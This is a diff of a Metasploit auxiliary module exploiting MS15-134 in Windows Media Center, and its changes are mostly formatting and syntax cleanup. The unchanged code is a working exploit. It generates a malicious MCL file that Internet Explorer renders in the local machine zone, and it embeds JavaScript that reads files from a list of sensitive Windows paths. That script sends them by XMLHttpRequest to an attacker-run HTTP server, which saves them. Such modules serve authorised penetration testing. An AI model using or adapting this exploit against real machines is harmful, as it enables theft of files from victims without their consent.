@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,44 +8,43 @@ require 'msf/core'
 require 'cgi'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::FILEFORMAT
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'MS15-134 Microsoft Windows Media Center MCL Information Disclosure',
-      'Description'    => %q{
-        This module exploits a vulnerability found in Windows Media Center. It allows an MCL
-        file to render itself as an HTML document in the local machine zone by Internet Explorer,
-        which can be used to leak files on the target machine.
+                      'Name'           => 'MS15-134 Microsoft Windows Media Center MCL Information Disclosure',
+                      'Description'    => %q{
+                        This module exploits a vulnerability found in Windows Media Center. It allows an MCL
+                        file to render itself as an HTML document in the local machine zone by Internet Explorer,
+                        which can be used to leak files on the target machine.
 
-        Please be aware that if this exploit is used against a patched Windows, it can cause the
-        computer to be very slow or unresponsive (100% CPU). It seems to be related to how the
-        exploit uses the URL attribute in order to render itself as an HTML file.
-      },
-      'Author'         =>
-        [
-          'Francisco Falcon', # Vuln discovery & PoCs & Detailed write-ups & awesomeness
-          'sinn3r'
-        ],
-      'References'     =>
-        [
-          ['CVE', '2015-6127'],
-          ['MSB', 'MS15-134'],
-          ['URL', 'https://blog.coresecurity.com/2015/12/09/exploiting-windows-media-center/'],
-          ['URL', 'http://www.coresecurity.com/advisories/microsoft-windows-media-center-link-file-incorrectly-resolved-reference']
-        ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Dec 8 2015",
-    ))
+                        Please be aware that if this exploit is used against a patched Windows, it can cause the
+                        computer to be very slow or unresponsive (100% CPU). It seems to be related to how the
+                        exploit uses the URL attribute in order to render itself as an HTML file.
+                      },
+                      'Author'         =>
+                        [
+                          'Francisco Falcon', # Vuln discovery & PoCs & Detailed write-ups & awesomeness
+                          'sinn3r'
+                        ],
+                      'References'     =>
+                        [
+                          ['CVE', '2015-6127'],
+                          ['MSB', 'MS15-134'],
+                          ['URL', 'https://blog.coresecurity.com/2015/12/09/exploiting-windows-media-center/'],
+                          ['URL', 'http://www.coresecurity.com/advisories/microsoft-windows-media-center-link-file-incorrectly-resolved-reference']
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => "Dec 8 2015"))
 
     register_options(
       [
         OptString.new('FILENAME', [true, 'The MCL file', 'msf.mcl']),
         OptPath.new('FILES',      [true, 'Files you wish to download', ::File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files_win.txt')])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def receiver_page
@@ -52,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def js
-    %Q|
+    %|
 function sendFile(fname, data) {
   var xmlHttp = new XMLHttpRequest();
   if (!xmlHttp) { return 0; }
@@ -70,7 +70,7 @@ function getFile(fname) {
   return xmlHttp.responseBody.toArray();
 }
 
-var files = [#{load_file_paths * ","}];
+var files = [#{load_file_paths * ','}];
 
 for (var i=0; i < files.length; i++) {
   try {
@@ -83,7 +83,7 @@ for (var i=0; i < files.length; i++) {
   end
 
   def generate_mcl
-    %Q|<application url="#{datastore['FILENAME']}">
+    %(<application url="#{datastore['FILENAME']}">
 <html>
 <head>
 <meta http-equiv="x-ua-compatible" content="IE-edge">
@@ -95,17 +95,17 @@ for (var i=0; i < files.length; i++) {
 </body>
 </html>
 </application>
-    |
+    )
   end
 
   def load_file_paths
-    @files ||= lambda {
+    @files ||= lambda do
       buf = ''
       ::File.open(datastore['FILES'], 'rb') do |f|
         buf = f.read
       end
-      buf.split.map { |n| "\"#{n.gsub!(/\\/, '/')}\"" }
-    }.call
+      buf.split.map { |n| "\"#{n.tr!('\\', '/')}\"" }
+    end.call
   end
 
   def run
@@ -136,7 +136,7 @@ for (var i=0; i < files.length; i++) {
   end
 
   def parse_body(body)
-    params = CGI::parse(body)
+    params = CGI.parse(body)
 
     {
       fname: ::File.basename(params['fname'].first),
@@ -168,7 +168,5 @@ for (var i=0; i < files.length; i++) {
     # here you go (handy for debugging purposes, but against a larger network this is probably
     # too much info)
     vprint_status("File collected: #{file[:fname]}\n\n#{Rex::Text.to_hex_dump(file[:data])}")
-
   end
-
 end
